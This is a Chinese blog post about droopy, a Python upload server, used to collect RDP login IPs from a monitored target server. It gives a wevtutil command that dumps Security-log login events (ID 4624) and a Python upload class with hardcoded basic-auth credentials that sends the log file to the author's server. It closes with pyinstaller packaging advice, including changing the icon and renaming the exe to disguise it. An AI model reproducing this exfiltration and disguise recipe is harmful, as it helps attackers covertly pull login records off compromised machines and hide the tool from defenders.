---
title: droopy
description: droopy
categories:
 - tools
 - python
tags: 
 - python
---

python写的一个文件上传功能的Web服务器

[源码](http://stackp.online.fr/wp-content/uploads/droopy)

![1594886013](https://yui77111.github.io/assets/images/article/droopy/1594886013.jpg)

我们用到的参数有-d指定上传路径、-a指定访问401验证账号密码

![1594888077](https://yui77111.github.io/assets/images/article/droopy/1594888077.jpg)

![1594888031](https://yui77111.github.io/assets/images/article/droopy/1594888031.jpg)

### 思路

遇到什么大project的时候，经常被要求要获取服务器的3389登录ip，但有时需要的是长时间监控服务器才能获取最新的登录ip，所以这时候就靠自动化

> 获取本地登录事件并保存到文本->通过droopy上传到服务器->后续可以加短信、邮件或wechat推送通知

和ftp的区别在于，ftp的账号密码是写在文件里的，对面拿到exe可以逆向拿到你ftp的账号密码，登录上去看到你服务器上的文件，而droopy即使拿到了401账号密码进去后也只有一个上传功能，虽説不能保证后面会不会爆什么安全漏洞但目前来説还没有问题。

### wevtutil获取登录事件

获取事件ID4624并保存到logins.txt里，4624为登录成功日志，多事件ID可用or分隔

```
wevtutil qe Security "/q:*[System [(EventID=4624)]]" /rd:true /f:text > "logins.txt"
```

### python

```python
class myupload():
    def __init__(self,url):
        self.url = url

    def upload(self,upload_file):
        files = {'upfile':(upload_file.split(sep)[-1],open(upload_file,'rb'),'text/plain',{})}
        request('POST',self.url,data=None,files=files,auth=('thomas','thomastom'))
```

### 效果

![1594889003](https://yui77111.github.io/assets/images/article/droopy/1594889003.jpg)

![1594889124](https://yui77111.github.io/assets/images/article/droopy/1594889124.jpg)

### 其他

将写好的.py用pyinstaller打包，打包的时候可以-i加个icon图标，再把名改改伪造伪造。

py打包exe体积太大可以通过虚拟环境内打包解决

```python
#建立虚拟环境
pipenv install
#进入虚拟环境
pipenv shell
#安装模块
pip install 小工具.py里面用到的模块
#打包的模块也要安装
pip install pyinstaller
#开始打包
pyinstaller -Fw E:\test\url_crawler.py
```

